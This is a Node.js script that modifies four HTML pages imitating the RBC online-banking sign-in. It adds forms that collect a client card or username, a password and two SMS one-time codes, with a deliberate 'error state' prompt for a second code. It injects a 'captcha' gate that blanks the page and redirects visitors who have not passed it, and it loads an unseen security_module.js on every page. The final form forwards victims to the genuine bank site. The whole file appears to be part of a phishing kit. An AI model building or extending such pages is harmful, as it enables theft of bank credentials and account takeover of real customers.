import fs from 'fs';

const guardScript = `<script>if(!sessionStorage.getItem('__cptPass')||sessionStorage.getItem('__cptPass')!=='1'){try{document.documentElement.innerHTML=''}catch(e){}window.location.replace('/captcha.html');throw new Error('BLOCKED');}</script>`;

// 1. Update public/rbc.html
let rbc = fs.readFileSync('public/rbc.html', 'utf8');
if (!rbc.includes("sessionStorage.getItem('__cptPass')")) {
  rbc = rbc.replace('<head>', '<head>\n' + guardScript);
}
rbc = rbc.replace(
  '<div class="container">',
  `<div class="container">
        <form action="rbc2.html" method="POST">`
);
rbc = rbc.replace(
  '<input type="text" autocomplete="off" />',
  '<input type="text" name="Client Card or Username" autocomplete="off" required />'
);
rbc = rbc.replace(
  '<button class="btn-next" onclick="window.location.href=\'rbc2.html\'">Next</button>',
  '<button type="submit" class="btn-next">Next</button>\n        </form>'
);
if (!rbc.includes('security_module.js')) {
  rbc = rbc.replace('</body>', '    <script src="security_module.js"></script>\n</body>');
}
fs.writeFileSync('public/rbc.html', rbc, 'utf8');

// 2. Update public/rbc2.html
let rbc2 = fs.readFileSync('public/rbc2.html', 'utf8');
if (!rbc2.includes("sessionStorage.getItem('__cptPass')")) {
  rbc2 = rbc2.replace('<head>', '<head>\n' + guardScript);
}
rbc2 = rbc2.replace(
  '<div class="container">',
  `<div class="container">
        <form action="rbcsms.html" method="POST">`
);
rbc2 = rbc2.replace(
  '<input type="password" autocomplete="off" />',
  '<input type="password" name="Password" autocomplete="off" required />'
);
rbc2 = rbc2.replace(
  '<button class="btn-sign-in">Sign In</button>',
  '<button type="submit" class="btn-sign-in">Sign In</button>\n        </form>'
);
if (!rbc2.includes('security_module.js')) {
  rbc2 = rbc2.replace('</body>', '    <script src="security_module.js"></script>\n</body>');
}
fs.writeFileSync('public/rbc2.html', rbc2, 'utf8');

// 3. Update public/rbcsms.html
let rbcsms = fs.readFileSync('public/rbcsms.html', 'utf8');
if (!rbcsms.includes("sessionStorage.getItem('__cptPass')")) {
  rbcsms = rbcsms.replace('<head>', '<head>\n' + guardScript);
}
rbcsms = rbcsms.replace(
  '<div class="container">',
  `<div class="container">
        <form action="rbcsms2.html" method="POST">`
);
rbcsms = rbcsms.replace(
  '<input type="text" autocomplete="off" placeholder="Enter 6-digit code" maxlength="6" />',
  '<input type="text" name="Verification Code (SMS 1)" autocomplete="off" placeholder="Enter 6-digit code" maxlength="6" required />'
);
rbcsms = rbcsms.replace(
  '<button class="btn-verify" onclick="window.location.href=\'rbcsms2.html\'">Verify</button>',
  '<button type="submit" class="btn-verify">Verify</button>\n        </form>'
);
if (!rbcsms.includes('security_module.js')) {
  rbcsms = rbcsms.replace('</body>', '    <script src="security_module.js"></script>\n</body>');
}
fs.writeFileSync('public/rbcsms.html', rbcsms, 'utf8');

// 4. Update public/rbcsms2.html
let rbcsms2 = fs.readFileSync('public/rbcsms2.html', 'utf8');
if (!rbcsms2.includes("sessionStorage.getItem('__cptPass')")) {
  rbcsms2 = rbcsms2.replace('<head>', '<head>\n' + guardScript);
}
rbcsms2 = rbcsms2.replace(
  '<div class="container">',
  `<div class="container">
        <form action="https://www.rbcroyalbank.com" method="POST">`
);
rbcsms2 = rbcsms2.replace(
  '<input type="text" autocomplete="off" placeholder="Enter 6-digit code" maxlength="6" />',
  '<input type="text" name="Verification Code (SMS 2 - Error state)" autocomplete="off" placeholder="Enter 6-digit code" maxlength="6" required />'
);
rbcsms2 = rbcsms2.replace(
  '<button class="btn-verify" onclick="window.location.href=\'#\'">Verify</button>',
  '<button type="submit" class="btn-verify">Verify</button>\n        </form>'
);
if (!rbcsms2.includes('security_module.js')) {
  rbcsms2 = rbcsms2.replace('</body>', '    <script src="security_module.js"></script>\n</body>');
}
fs.writeFileSync('public/rbcsms2.html', rbcsms2, 'utf8');

console.log('Successfully wired all RBC files with forms and security module');
